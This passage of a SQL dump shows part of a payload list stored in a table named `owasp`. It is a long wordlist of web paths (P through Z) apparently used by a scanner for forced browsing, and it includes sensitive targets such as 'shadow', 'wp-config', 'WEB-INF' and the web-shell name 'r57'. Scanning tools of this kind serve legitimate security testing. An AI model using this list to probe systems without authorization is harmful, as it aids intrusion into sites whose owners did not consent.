\"product_image\",\n      \"product_images\",\n      \"product_info\",\n      \"product_reviews\",\n      \"product_thumb\",\n      \"productdetails\",\n      \"productimage\",\n      \"production\",\n      \"production.log\",\n      \"productquestion\",\n      \"products\",\n      \"Products\",\n      \"products_new\",\n      \"product-sort\",\n      \"productspecs\",\n      \"productupdates\",\n      \"produkte\",\n      \"professor\",\n      \"profil\",\n      \"profile\",\n      \"profiles\",\n      \"profiling\",\n      \"proftpd\",\n      \"prog\",\n      \"program\",\n      \"Program Files\",\n      \"programming\",\n      \"programs\",\n      \"progress\",\n      \"project\",\n      \"project-admins\",\n      \"projects\",\n      \"Projects\",\n      \"promo\",\n      \"promos\",\n      \"promoted\",\n      \"promotion\",\n      \"promotions\",\n      \"proof\",\n      \"proofs\",\n      \"prop\",\n      \"prop-base\",\n      \"properties\",\n      \"property\",\n      \"props\",\n      \"prot\",\n      \"protect\",\n      \"protected\",\n      \"protection\",\n      \"proto\",\n      \"provider\",\n      \"providers\",\n      \"proxies\",\n      \"proxy\",\n      \"prueba\",\n      \"pruebas\",\n      \"prv\",\n      \"prv_download\",\n      \"ps\",\n      \"psd\",\n      \"psp\",\n      \"psql\",\n      \"pt\",\n      \"pt_BR\",\n      \"ptopic\",\n      \"pub\",\n      \"public\",\n      \"public_ftp\",\n      \"public_html\",\n      \"publication\",\n      \"publications\",\n      \"Publications\",\n      \"publicidad\",\n      \"publish\",\n      \"published\",\n      \"publisher\",\n      \"pubs\",\n      \"pull\",\n      \"purchase\",\n      \"purchases\",\n      \"purchasing\",\n      \"pureadmin\",\n      \"push\",\n      \"put\",\n      \"putty\",\n      \"putty.reg\",\n      \"pw\",\n      \"pw_ajax\",\n      \"pw_api\",\n      \"pw_app\",\n      \"pwd\",\n      \"py\",\n      \"python\",\n      \"q\",\n      \"q1\",\n      \"q2\",\n      \"q3\",\n      \"q4\",\n      \"qa\",\n      \"qinetiq\",\n      \"qotd\",\n      \"qpid\",\n      \"qsc\",\n      \"quarterly\",\n      \"queries\",\n      \"query\",\n      \"question\",\n      \"questions\",\n      \"queue\",\n      \"queues\",\n      \"quick\",\n      \"quickstart\",\n      \"quiz\",\n      \"quote\",\n      \"quotes\",\n      \"r\",\n      \"R\",\n      \"r57\",\n      \"radcontrols\",\n      \"radio\",\n      \"radmind\",\n      \"radmind-1\",\n      \"rail\",\n      \"rails\",\n      \"Rakefile\",\n      \"ramon\",\n      \"random\",\n      \"rank\",\n      \"ranks\",\n      \"rar\",\n      \"rarticles\",\n      \"rate\",\n      \"ratecomment\",\n      \"rateit\",\n      \"ratepic\",\n      \"rates\",\n      \"ratethread\",\n      \"rating\",\n      \"rating0\",\n      \"ratings\",\n      \"rb\",\n      \"rcLogin\",\n      \"rcp\",\n      \"rcs\",\n      \"RCS\",\n      \"rct\",\n      \"rd\",\n      \"rdf\",\n      \"read\",\n      \"reader\",\n      \"readfile\",\n      \"readfolder\",\n      \"readme\",\n      \"Readme\",\n      \"README\",\n      \"real\",\n      \"realaudio\",\n      \"realestate\",\n      \"RealMedia\",\n      \"receipt\",\n      \"receipts\",\n      \"receive\",\n      \"received\",\n      \"recent\",\n      \"recharge\",\n      \"recherche\",\n      \"recipes\",\n      \"recommend\",\n      \"recommends\",\n      \"record\",\n      \"recorded\",\n      \"recorder\",\n      \"records\",\n      \"recoverpassword\",\n      \"recovery\",\n      \"recycle\",\n      \"recycled\",\n      \"Recycled\",\n      \"red\",\n      \"reddit\",\n      \"redesign\",\n      \"redir\",\n      \"redirect\",\n      \"redirection\",\n      \"redirector\",\n      \"redirects\",\n      \"redis\",\n      \"ref\",\n      \"refer\",\n      \"reference\",\n      \"references\",\n      \"referer\",\n      \"referral\",\n      \"referrers\",\n      \"refuse\",\n      \"refused\",\n      \"reg\",\n      \"reginternal\",\n      \"region\",\n      \"regional\",\n      \"register\",\n      \"registered\",\n      \"registration\",\n      \"registrations\",\n      \"registro\",\n      \"reklama\",\n      \"related\",\n      \"release\",\n      \"releases\",\n      \"religion\",\n      \"remind\",\n      \"remind_password\",\n      \"reminder\",\n      \"remote\",\n      \"remotetracer\",\n      \"removal\",\n      \"removals\",\n      \"remove\",\n      \"removed\",\n      \"render\",\n      \"rendered\",\n      \"reorder\",\n      \"rep\",\n      \"repl\",\n      \"replica\",\n      \"replicas\",\n      \"replicate\",\n      \"replicated\",\n      \"replication\",\n      \"replicator\",\n      \"reply\",\n      \"repo\",\n      \"report\",\n      \"reporting\",\n      \"reports\",\n      \"reports list\",\n      \"repository\",\n      \"repost\",\n      \"reprints\",\n      \"reputation\",\n      \"req\",\n      \"reqs\",\n      \"request\",\n      \"requested\",\n      \"requests\",\n      \"require\",\n      \"requisite\",\n      \"requisition\",\n      \"requisitions\",\n      \"res\",\n      \"research\",\n      \"Research\",\n      \"reseller\",\n      \"resellers\",\n      \"reservation\",\n      \"reservations\",\n      \"resin\",\n      \"resin-admin\",\n      \"resize\",\n      \"resolution\",\n      \"resolve\",\n      \"resolved\",\n      \"resource\",\n      \"resources\",\n      \"Resources\",\n      \"respond\",\n      \"responder\",\n      \"rest\",\n      \"restaurants\",\n      \"restore\",\n      \"restored\",\n      \"restricted\",\n      \"result\",\n      \"results\",\n      \"resume\",\n      \"resumes\",\n      \"retail\",\n      \"returns\",\n      \"reusablecontent\",\n      \"reverse\",\n      \"reversed\",\n      \"revert\",\n      \"reverted\",\n      \"review\",\n      \"reviews\",\n      \"rfid\",\n      \"rhtml\",\n      \"right\",\n      \"ro\",\n      \"roadmap\",\n      \"roam\",\n      \"roaming\",\n      \"robot\",\n      \"robotics\",\n      \"robots\",\n      \"robots.txt\",\n      \"role\",\n      \"roles\",\n      \"roller\",\n      \"room\",\n      \"root\",\n      \"Root\",\n      \"rorentity\",\n      \"rorindex\",\n      \"rortopics\",\n      \"route\",\n      \"router\",\n      \"routes\",\n      \"rpc\",\n      \"rs\",\n      \"rsa\",\n      \"rss\",\n      \"RSS\",\n      \"rss10\",\n      \"rss2\",\n      \"rss20\",\n      \"rssarticle\",\n      \"rssfeed\",\n      \"rsync\",\n      \"rte\",\n      \"rtf\",\n      \"ru\",\n      \"rub\",\n      \"ruby\",\n      \"rule\",\n      \"rules\",\n      \"run\",\n      \"rus\",\n      \"rwservlet\",\n      \"s\",\n      \"S\",\n      \"s1\",\n      \"sa\",\n      \"safe\",\n      \"safety\",\n      \"sale\",\n      \"sales\",\n      \"salesforce\",\n      \"sam\",\n      \"samba\",\n      \"saml\",\n      \"sample\",\n      \"samples\",\n      \"san\",\n      \"sandbox\",\n      \"sav\",\n      \"save\",\n      \"saved\",\n      \"saves\",\n      \"sb\",\n      \"sbin\",\n      \"sc\",\n      \"scan\",\n      \"scanned\",\n      \"scans\",\n      \"scgi-bin\",\n      \"sched\",\n      \"schedule\",\n      \"scheduled\",\n      \"scheduling\",\n      \"schema\",\n      \"schemas\",\n      \"schemes\",\n      \"school\",\n      \"schools\",\n      \"science\",\n      \"scope\",\n      \"scr\",\n      \"scratc\",\n      \"screen\",\n      \"screens\",\n      \"screenshot\",\n      \"screenshots\",\n      \"script\",\n      \"scripte\",\n      \"scriptlet\",\n      \"scriptlets\",\n      \"scriptlibrary\",\n      \"scriptresource\",\n      \"scripts\",\n      \"Scripts\",\n      \"sd\",\n      \"sdk\",\n      \"se\",\n      \"search\",\n      \"Search\",\n      \"search_result\",\n      \"search_results\",\n      \"searchnx\",\n      \"searchresults\",\n      \"search-results\",\n      \"searchurl\",\n      \"sec\",\n      \"seccode\",\n      \"second\",\n      \"secondary\",\n      \"secret\",\n      \"secrets\",\n      \"section\",\n      \"sections\",\n      \"secure\",\n      \"secure_login\",\n      \"secureauth\",\n      \"secured\",\n      \"secureform\",\n      \"secureprocess\",\n      \"securimage\",\n      \"security\",\n      \"Security\",\n      \"seed\",\n      \"select\",\n      \"selectaddress\",\n      \"selected\",\n      \"selection\",\n      \"self\",\n      \"sell\",\n      \"sem\",\n      \"seminar\",\n      \"seminars\",\n      \"send\",\n      \"send_order\",\n      \"send_pwd\",\n      \"send_to_friend\",\n      \"sendform\",\n      \"sendfriend\",\n      \"sendmail\",\n      \"sendmessage\",\n      \"send-password\",\n      \"sendpm\",\n      \"sendthread\",\n      \"sendto\",\n      \"sendtofriend\",\n      \"sensepost\",\n      \"sensor\",\n      \"sent\",\n      \"seo\",\n      \"serial\",\n      \"serv\",\n      \"serve\",\n      \"server\",\n      \"Server\",\n      \"server_admin_small\",\n      \"server_stats\",\n      \"ServerAdministrator\",\n      \"SERVER-INF\",\n      \"server-info\",\n      \"servers\",\n      \"server-status\",\n      \"service\",\n      \"servicelist\",\n      \"services\",\n      \"Services\",\n      \"servicio\",\n      \"servicios\",\n      \"servlet\",\n      \"Servlet\",\n      \"servlets\",\n      \"Servlets\",\n      \"servlets-examples\",\n      \"sess\",\n      \"session\",\n      \"sessionid\",\n      \"sessionlist\",\n      \"sessions\",\n      \"set\",\n      \"setcurrency\",\n      \"setlocale\",\n      \"setting\",\n      \"settings\",\n      \"setup\",\n      \"setvatsetting\",\n      \"sex\",\n      \"sf\",\n      \"sg\",\n      \"sh\",\n      \"shadow\",\n      \"shaken\",\n      \"share\",\n      \"shared\",\n      \"shares\",\n      \"shell\",\n      \"shim\",\n      \"ship\",\n      \"shipped\",\n      \"shipping\",\n      \"shipping_help\",\n      \"shippinginfo\",\n      \"shipquote\",\n      \"shit\",\n      \"shockwave\",\n      \"shop\",\n      \"shop_closed\",\n      \"shop_content\",\n      \"shopadmin\",\n      \"shopper\",\n      \"shopping\",\n      \"shopping_cart\",\n      \"shoppingcart\",\n      \"shopping-lists\",\n      \"shops\",\n      \"shops_buyaction\",\n      \"shopstat\",\n      \"shopsys\",\n      \"shoutbox\",\n      \"show\",\n      \"show_post\",\n      \"show_thread\",\n      \"showallsites\",\n      \"showcase\",\n      \"showcat\",\n      \"showcode\",\n      \"showenv\",\n      \"showgroups\",\n      \"showjobs\",\n      \"showkey\",\n      \"showlogin\",\n      \"showmap\",\n      \"showmsg\",\n      \"showpost\",\n      \"showroom\",\n      \"shows\",\n      \"showthread\",\n      \"shtml\",\n      \"si\",\n      \"sid\",\n      \"sign\",\n      \"sign_up\",\n      \"signature\",\n      \"signaturepics\",\n      \"signed\",\n      \"signer\",\n      \"signin\",\n      \"signing\",\n      \"signoff\",\n      \"signon\",\n      \"signout\",\n      \"signup\",\n      \"sign-up\",\n      \"simple\",\n      \"simplelogin\",\n      \"simpleLogin\",\n      \"single\",\n      \"single_pages\",\n      \"sink\",\n      \"site\",\n      \"site_map\",\n      \"siteadmin\",\n      \"sitebuilder\",\n      \"sitecore\",\n      \"sitefiles\",\n      \"siteimages\",\n      \"sitemap\",\n      \"site-map\",\n      \"SiteMap\",\n      \"sitemap.gz\",\n      \"sitemap.xml\",\n      \"sitemaps\",\n      \"sitemgr\",\n      \"sites\",\n      \"Sites\",\n      \"SiteScope\",\n      \"sitesearch\",\n      \"SiteServer\",\n      \"sk\",\n      \"skel\",\n      \"skin\",\n      \"skin1\",\n      \"skin1_original\",\n      \"skins\",\n      \"skip\",\n      \"sl\",\n      \"slabel\",\n      \"slashdot\",\n      \"slide_show\",\n      \"slides\",\n      \"slideshow\",\n      \"slimstat\",\n      \"sling\",\n      \"sm\",\n      \"small\",\n      \"smarty\",\n      \"smb\",\n      \"smblogin\",\n      \"smf\",\n      \"smile\",\n      \"smiles\",\n      \"smileys\",\n      \"smilies\",\n      \"sms\",\n      \"smtp\",\n      \"snippets\",\n      \"snoop\",\n      \"snp\",\n      \"so\",\n      \"soap\",\n      \"soapdocs\",\n      \"SOAPMonitor\",\n      \"soaprouter\",\n      \"social\",\n      \"soft\",\n      \"software\",\n      \"Software\",\n      \"sohoadmin\",\n      \"solaris\",\n      \"sold\",\n      \"solution\",\n      \"solutions\",\n      \"solve\",\n      \"solved\",\n      \"somebody\",\n      \"songs\",\n      \"sony\",\n      \"soporte\",\n      \"sort\",\n      \"sound\",\n      \"sounds\",\n      \"source\",\n      \"sources\",\n      \"Sources\",\n      \"sox\",\n      \"sp\",\n      \"space\",\n      \"spacer\",\n      \"spain\",\n      \"spam\",\n      \"spamlog.log\",\n      \"spanish\",\n      \"spaw\",\n      \"speakers\",\n      \"spec\",\n      \"special\",\n      \"special_offers\",\n      \"specials\",\n      \"specified\",\n      \"specs\",\n      \"speedtest\",\n      \"spellchecker\",\n      \"sphider\",\n      \"spider\",\n      \"spiders\",\n      \"splash\",\n      \"sponsor\",\n      \"sponsors\",\n      \"spool\",\n      \"sport\",\n      \"sports\",\n      \"Sports\",\n      \"spotlight\",\n      \"spryassets\",\n      \"Spy\",\n      \"spyware\",\n      \"sq\",\n      \"sql\",\n      \"SQL\",\n      \"sqladmin\",\n      \"sql-admin\",\n      \"sqlmanager\",\n      \"sqlnet\",\n      \"sqlweb\",\n      \"squelettes\",\n      \"squelettes-dist\",\n      \"squirrel\",\n      \"squirrelmail\",\n      \"sr\",\n      \"src\",\n      \"srchad\",\n      \"srv\",\n      \"ss\",\n      \"ss_vms_admin_sm\",\n      \"ssfm\",\n      \"ssh\",\n      \"sshadmin\",\n      \"ssi\",\n      \"ssl\",\n      \"ssl_check\",\n      \"sslvpn\",\n      \"ssn\",\n      \"sso\",\n      \"ssp_director\",\n      \"st\",\n      \"stackdump\",\n      \"staff\",\n      \"staff_directory\",\n      \"staffs\",\n      \"stage\",\n      \"staging\",\n      \"stale\",\n      \"standalone\",\n      \"standard\",\n      \"standards\",\n      \"star\",\n      \"staradmin\",\n      \"start\",\n      \"starter\",\n      \"startpage\",\n      \"stat\",\n      \"state\",\n      \"statement\",\n      \"statements\",\n      \"states\",\n      \"static\",\n      \"staticpages\",\n      \"statistic\",\n      \"statistics\",\n      \"Statistics\",\n      \"statistik\",\n      \"stats\",\n      \"Stats\",\n      \"statshistory\",\n      \"status\",\n      \"statusicon\",\n      \"stock\",\n      \"stoneedge\",\n      \"stop\",\n      \"storage\",\n      \"store\",\n      \"store_closed\",\n      \"stored\",\n      \"stores\",\n      \"stories\",\n      \"story\",\n      \"stow\",\n      \"strategy\",\n      \"stream\",\n      \"string\",\n      \"strut\",\n      \"struts\",\n      \"student\",\n      \"students\",\n      \"studio\",\n      \"stuff\",\n      \"style\",\n      \"style_avatars\",\n      \"style_captcha\",\n      \"style_css\",\n      \"style_emoticons\",\n      \"style_images\",\n      \"styles\",\n      \"stylesheet\",\n      \"stylesheets\",\n      \"sub\",\n      \"subdomains\",\n      \"subject\",\n      \"sub-login\",\n      \"submenus\",\n      \"submissions\",\n      \"submit\",\n      \"submitter\",\n      \"subs\",\n      \"subscribe\",\n      \"subscribed\",\n      \"subscriber\",\n      \"subscribers\",\n      \"subscription\",\n      \"subscriptions\",\n      \"success\",\n      \"suche\",\n      \"sucontact\",\n      \"suffix\",\n      \"suggest\",\n      \"suggest-listing\",\n      \"suite\",\n      \"suites\",\n      \"summary\",\n      \"sun\",\n      \"sunos\",\n      \"SUNWmc\",\n      \"super\",\n      \"Super-Admin\",\n      \"supplier\",\n      \"support\",\n      \"Support\",\n      \"support_login\",\n      \"supported\",\n      \"surf\",\n      \"survey\",\n      \"surveys\",\n      \"suspended.page\",\n      \"suupgrade\",\n      \"sv\",\n      \"svc\",\n      \"svn\",\n      \"svn-base\",\n      \"svr\",\n      \"sw\",\n      \"swajax1\",\n      \"swf\",\n      \"swfobject.js\",\n      \"swfs\",\n      \"switch\",\n      \"sws\",\n      \"synapse\",\n      \"sync\",\n      \"synced\",\n      \"syndication\",\n      \"sys\",\n      \"sysadmin\",\n      \"sys-admin\",\n      \"SysAdmin\",\n      \"sysadmin2\",\n      \"SysAdmin2\",\n      \"sysadmins\",\n      \"sysmanager\",\n      \"system\",\n      \"system_admin\",\n      \"system_administration\",\n      \"system_web\",\n      \"system-admin\",\n      \"system-administration\",\n      \"systems\",\n      \"sysuser\",\n      \"szukaj\",\n      \"t\",\n      \"T\",\n      \"t1\",\n      \"t3lib\",\n      \"table\",\n      \"tabs\",\n      \"tag\",\n      \"tagline\",\n      \"tags\",\n      \"tail\",\n      \"talk\",\n      \"talks\",\n      \"tape\",\n      \"tapes\",\n      \"tapestry\",\n      \"tar\",\n      \"tar.bz2\",\n      \"tar.gz\",\n      \"target\",\n      \"tartarus\",\n      \"task\",\n      \"tasks\",\n      \"taxonomy\",\n      \"tb\",\n      \"tcl\",\n      \"te\",\n      \"team\",\n      \"tech\",\n      \"technical\",\n      \"technology\",\n      \"Technology\",\n      \"tel\",\n      \"tele\",\n      \"television\",\n      \"tell_a_friend\",\n      \"tell_friend\",\n      \"tellafriend\",\n      \"temaoversikt\",\n      \"temp\",\n      \"TEMP\",\n      \"templ\",\n      \"template\",\n      \"templates\",\n      \"templates_c\",\n      \"templets\",\n      \"temporal\",\n      \"temporary\",\n      \"temps\",\n      \"term\",\n      \"terminal\",\n      \"terms\",\n      \"terms_privacy\",\n      \"termsofuse\",\n      \"terms-of-use\",\n      \"terrorism\",\n      \"test\",\n      \"test_db\",\n      \"test1\",\n      \"test123\",\n      \"test1234\",\n      \"test2\",\n      \"test3\",\n      \"test-cgi\",\n      \"teste\",\n      \"test-env\",\n      \"testimonial\",\n      \"testimonials\",\n      \"testing\",\n      \"tests\",\n      \"testsite\",\n      \"texis\",\n      \"text\",\n      \"text-base\",\n      \"textobject\",\n      \"textpattern\",\n      \"texts\",\n      \"tgp\",\n      \"tgz\",\n      \"th\",\n      \"thanks\",\n      \"thankyou\",\n      \"thank-you\",\n      \"the\",\n      \"theme\",\n      \"themes\",\n      \"Themes\",\n      \"thickbox\",\n      \"third-party\",\n      \"this\",\n      \"thread\",\n      \"threadrate\",\n      \"threads\",\n      \"threadtag\",\n      \"thumb\",\n      \"thumbnail\",\n      \"thumbnails\",\n      \"thumbs\",\n      \"thumbs.db\",\n      \"Thumbs.db\",\n      \"ticket\",\n      \"ticket_list\",\n      \"ticket_new\",\n      \"tickets\",\n      \"tienda\",\n      \"tiki\",\n      \"tiles\",\n      \"time\",\n      \"timeline\",\n      \"tiny_mce\",\n      \"tinymce\",\n      \"tip\",\n      \"tips\",\n      \"title\",\n      \"titles\",\n      \"tl\",\n      \"tls\",\n      \"tmp\",\n      \"TMP\",\n      \"tmpl\",\n      \"tmps\",\n      \"tn\",\n      \"tncms\",\n      \"to\",\n      \"toc\",\n      \"today\",\n      \"todel\",\n      \"todo\",\n      \"TODO\",\n      \"toggle\",\n      \"tomcat\",\n      \"tomcat-docs\",\n      \"tool\",\n      \"toolbar\",\n      \"toolkit\",\n      \"tools\",\n      \"tooltip\",\n      \"top\",\n      \"top1\",\n      \"topic\",\n      \"topicadmin\",\n      \"topics\",\n      \"toplist\",\n      \"toplists\",\n      \"topnav\",\n      \"topsites\",\n      \"torrent\",\n      \"torrents\",\n      \"tos\",\n      \"tour\",\n      \"tours\",\n      \"toys\",\n      \"tp\",\n      \"tpl\",\n      \"tpv\",\n      \"tr\",\n      \"trac\",\n      \"trace\",\n      \"traceroute\",\n      \"traces\",\n      \"track\",\n      \"trackback\",\n      \"trackclick\",\n      \"tracker\",\n      \"trackers\",\n      \"tracking\",\n      \"trackpackage\",\n      \"tracks\",\n      \"trade\",\n      \"trademarks\",\n      \"traffic\",\n      \"trailer\",\n      \"trailers\",\n      \"training\",\n      \"trans\",\n      \"transaction\",\n      \"transactions\",\n      \"transfer\",\n      \"transformations\",\n      \"translate\",\n      \"translations\",\n      \"transparent\",\n      \"transport\",\n      \"trap\",\n      \"trash\",\n      \"travel\",\n      \"Travel\",\n      \"treasury\",\n      \"tree\",\n      \"trees\",\n      \"trends\",\n      \"trial\",\n      \"true\",\n      \"trunk\",\n      \"tslib\",\n      \"tsweb\",\n      \"tt\",\n      \"tuning\",\n      \"turbine\",\n      \"tuscany\",\n      \"tutorial\",\n      \"tutorials\",\n      \"tv\",\n      \"tw\",\n      \"twatch\",\n      \"tweak\",\n      \"twiki\",\n      \"twitter\",\n      \"tx\",\n      \"txt\",\n      \"type\",\n      \"typo3\",\n      \"typo3_src\",\n      \"typo3conf\",\n      \"typo3temp\",\n      \"typolight\",\n      \"u\",\n      \"U\",\n      \"ua\",\n      \"ubb\",\n      \"uc\",\n      \"uc_client\",\n      \"uc_server\",\n      \"ucenter\",\n      \"ucp\",\n      \"uddi\",\n      \"uds\",\n      \"ui\",\n      \"uk\",\n      \"umbraco\",\n      \"umbraco_client\",\n      \"umts\",\n      \"uncategorized\",\n      \"under_update\",\n      \"uninstall\",\n      \"union\",\n      \"unix\",\n      \"unlock\",\n      \"unpaid\",\n      \"unreg\",\n      \"unregister\",\n      \"unsafe\",\n      \"unsubscribe\",\n      \"unused\",\n      \"up\",\n      \"upcoming\",\n      \"upd\",\n      \"update\",\n      \"updated\",\n      \"updateinstaller\",\n      \"updater\",\n      \"updates\",\n      \"updates-topic\",\n      \"upgrade\",\n      \"upgrade.readme\",\n      \"upload\",\n      \"upload_file\",\n      \"upload_files\",\n      \"uploaded\",\n      \"uploadedfiles\",\n      \"uploadedimages\",\n      \"uploader\",\n      \"uploadfile\",\n      \"uploadfiles\",\n      \"uploads\",\n      \"ur-admin\",\n      \"urchin\",\n      \"url\",\n      \"urlrewriter\",\n      \"urls\",\n      \"us\",\n      \"US\",\n      \"usa\",\n      \"usage\",\n      \"user\",\n      \"user_upload\",\n      \"useradmin\",\n      \"userapp\",\n      \"usercontrols\",\n      \"usercp\",\n      \"usercp2\",\n      \"userdir\",\n      \"userfiles\",\n      \"UserFiles\",\n      \"userimages\",\n      \"userinfo\",\n      \"userlist\",\n      \"userlog\",\n      \"userlogin\",\n      \"usermanager\",\n      \"username\",\n      \"usernames\",\n      \"usernote\",\n      \"users\",\n      \"usr\",\n      \"usrmgr\",\n      \"usrs\",\n      \"ustats\",\n      \"usuario\",\n      \"usuarios\",\n      \"util\",\n      \"utilities\",\n      \"Utilities\",\n      \"utility\",\n      \"utility_login\",\n      \"utils\",\n      \"v\",\n      \"V\",\n      \"v1\",\n      \"v2\",\n      \"v3\",\n      \"v4\",\n      \"vadmind\",\n      \"validation\",\n      \"validatior\",\n      \"vap\",\n      \"var\",\n      \"vault\",\n      \"vb\",\n      \"vbmodcp\",\n      \"vbs\",\n      \"vbscript\",\n      \"vbscripts\",\n      \"vbseo\",\n      \"vbseocp\",\n      \"vcss\",\n      \"vdsbackup\",\n      \"vector\",\n      \"vehicle\",\n      \"vehiclemakeoffer\",\n      \"vehiclequote\",\n      \"vehicletestdrive\",\n      \"velocity\",\n      \"venda\",\n      \"vendor\",\n      \"vendors\",\n      \"ver\",\n      \"ver1\",\n      \"ver2\",\n      \"version\",\n      \"verwaltung\",\n      \"vfs\",\n      \"vi\",\n      \"viagra\",\n      \"vid\",\n      \"video\",\n      \"Video\",\n      \"videos\",\n      \"view\",\n      \"view_cart\",\n      \"viewcart\",\n      \"viewcvs\",\n      \"viewer\",\n      \"viewfile\",\n      \"viewforum\",\n      \"viewlogin\",\n      \"viewonline\",\n      \"views\",\n      \"viewsource\",\n      \"view-source\",\n      \"viewsvn\",\n      \"viewthread\",\n      \"viewtopic\",\n      \"viewvc\",\n      \"vip\",\n      \"virtual\",\n      \"virus\",\n      \"visit\",\n      \"visitor\",\n      \"visitormessage\",\n      \"vista\",\n      \"vm\",\n      \"vmailadmin\",\n      \"void\",\n      \"voip\",\n      \"vol\",\n      \"volunteer\",\n      \"vote\",\n      \"voted\",\n      \"voter\",\n      \"votes\",\n      \"vp\",\n      \"vpg\",\n      \"vpn\",\n      \"vs\",\n      \"vsadmin\",\n      \"vuln\",\n      \"vvc_display\",\n      \"w\",\n      \"W\",\n      \"w3\",\n      \"w3c\",\n      \"w3svc\",\n      \"W3SVC\",\n      \"W3SVC1\",\n      \"W3SVC2\",\n      \"W3SVC3\",\n      \"wa\",\n      \"wallpaper\",\n      \"wallpapers\",\n      \"wap\",\n      \"war\",\n      \"warenkorb\",\n      \"warez\",\n      \"warn\",\n      \"way-board\",\n      \"wbboard\",\n      \"wbsadmin\",\n      \"wc\",\n      \"wcs\",\n      \"wdav\",\n      \"weather\",\n      \"web\",\n      \"web.config\",\n      \"web.xml\",\n      \"web_users\",\n      \"web1\",\n      \"web2\",\n      \"web3\",\n      \"webaccess\",\n      \"webadm\",\n      \"webadmin\",\n      \"WebAdmin\",\n      \"webagent\",\n      \"webalizer\",\n      \"webapp\",\n      \"webapps\",\n      \"webb\",\n      \"webbbs\",\n      \"web-beans\",\n      \"webboard\",\n      \"webcalendar\",\n      \"webcam\",\n      \"webcart\",\n      \"webcast\",\n      \"webcasts\",\n      \"webcgi\",\n      \"webcharts\",\n      \"webchat\",\n      \"web-console\",\n      \"webctrl_client\",\n      \"webdata\",\n      \"webdav\",\n      \"webdb\",\n      \"webdist\",\n      \"webedit\",\n      \"webfm_send\",\n      \"webhits\",\n      \"webim\",\n      \"webinar\",\n      \"web-inf\",\n      \"WEB-INF\",\n      \"weblog\",\n      \"weblogic\",\n      \"weblogs\",\n      \"webmail\",\n      \"webmaster\",\n      \"webmasters\",\n      \"webpages\",\n      \"webplus\",\n      \"webresource\",\n      \"websearch\",\n      \"webservice\",\n      \"webservices\",\n      \"webshop\",\n      \"website\",\n      \"websites\",\n      \"websphere\",\n      \"websql\",\n      \"webstat\",\n      \"webstats\",\n      \"websvn\",\n      \"webtrends\",\n      \"webusers\",\n      \"webvpn\",\n      \"webwork\",\n      \"wedding\",\n      \"week\",\n      \"weekly\",\n      \"welcome\",\n      \"well\",\n      \"wellcome\",\n      \"werbung\",\n      \"wget\",\n      \"what\",\n      \"whatever\",\n      \"whatnot\",\n      \"whatsnew\",\n      \"white\",\n      \"whitepaper\",\n      \"whitepapers\",\n      \"who\",\n      \"whois\",\n      \"wholesale\",\n      \"whosonline\",\n      \"why\",\n      \"wicket\",\n      \"wide_search\",\n      \"widget\",\n      \"widgets\",\n      \"wifi\",\n      \"wii\",\n      \"wiki\",\n      \"will\",\n      \"win\",\n      \"win32\",\n      \"windows\",\n      \"Windows\",\n      \"wink\",\n      \"winnt\",\n      \"wireless\",\n      \"wishlist\",\n      \"with\",\n      \"wiz\",\n      \"wizard\",\n      \"wizmysqladmin\",\n      \"wml\",\n      \"wolthuis\",\n      \"word\",\n      \"wordpress\",\n      \"work\",\n      \"workarea\",\n      \"workflowtasks\",\n      \"working\",\n      \"workplace\",\n      \"works\",\n      \"workshop\",\n      \"workshops\",\n      \"world\",\n      \"worldpayreturn\",\n      \"worldwide\",\n      \"wow\",\n      \"wp\",\n      \"wp-admin\",\n      \"wp-app\",\n      \"wp-atom\",\n      \"wpau-backup\",\n      \"wp-blog-header\",\n      \"wpcallback\",\n      \"wp-comments\",\n      \"wp-commentsrss2\",\n      \"wp-config\",\n      \"wpcontent\",\n      \"wp-content\",\n      \"wp-cron\",\n      \"wp-dbmanager\",\n      \"wp-feed\",\n      \"wp-icludes\",\n      \"wp-images\",\n      \"wp-includes\",\n      \"wp-links-opml\",\n      \"wp-load\",\n      \"wp-login\",\n      \"wp-mail\",\n      \"wp-pass\",\n      \"wp-rdf\",\n      \"wp-register\",\n      \"wp-rss\",\n      \"wp-rss2\",\n      \"wps\",\n      \"wp-settings\",\n      \"wp-signup\",\n      \"wp-syntax\",\n      \"wp-trackback\",\n      \"wrap\",\n      \"writing\",\n      \"ws\",\n      \"ws_ftp\",\n      \"WS_FTP\",\n      \"WS_FTP.LOG\",\n      \"ws-client\",\n      \"wsdl\",\n      \"wss\",\n      \"wstat\",\n      \"wstats\",\n      \"wt\",\n      \"wtai\",\n      \"wusage\",\n      \"wwhelp\",\n      \"www\",\n      \"www1\",\n      \"www2\",\n      \"www3\",\n      \"wwwboard\",\n      \"wwwjoin\",\n      \"wwwlog\",\n      \"wwwroot\",\n      \"www-sql\",\n      \"wwwstat\",\n      \"wwwstats\",\n      \"wwwthreads\",\n      \"wwwuser\",\n      \"wysiwyg\",\n      \"wysiwygpro\",\n      \"x\",\n      \"X\",\n      \"xajax\",\n      \"xajax_js\",\n      \"xalan\",\n      \"xbox\",\n      \"xcache\",\n      \"xcart\",\n      \"xd_receiver\",\n      \"xdb\",\n      \"xerces\",\n      \"xfer\",\n      \"xhtml\",\n      \"xlogin\",\n      \"xls\",\n      \"xmas\",\n      \"xml\",\n      \"XML\",\n      \"xmlfiles\",\n      \"xmlimporter\",\n      \"xmlrpc\",\n      \"xml-rpc\",\n      \"xmlrpc.php\",\n      \"xmlrpc_server\",\n      \"xmlrpc_server.php\",\n      \"xn\",\n      \"xsl\",\n      \"xslt\",\n      \"xsql\",\n      \"xx\",\n      \"xxx\",\n      \"XXX\",\n      \"xyz\",\n      \"xyzzy\",\n      \"y\",\n      \"yahoo\",\n      \"year\",\n      \"yearly\",\n      \"yesterday\",\n      \"yml\",\n      \"yonetici\",\n      \"yonetim\",\n      \"youtube\",\n      \"yshop\",\n      \"yt\",\n      \"yui\",\n      \"z\",\n      \"zap\",\n      \"zboard\",\n      \"zencart\",\n      \"zend\",\n      \"zero\",\n      \"zeus\",\n      \"zh\",\n      \"zh_CN\",\n      \"zh_TW\",\n      \"zh-cn\",\n      \"zh-tw\",\n      \"zimbra\",\n      \"zip\",\n      \"zipfiles\",\n      \"zips\",\n      \"zoeken\",\n      \"zone\",\n      \"zones\",\n      \"zoom\",\n      \"zope\",\n      \"zorum\",\n      \"zt\"\n   \n    ]\n  }', NULL, 0, '');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
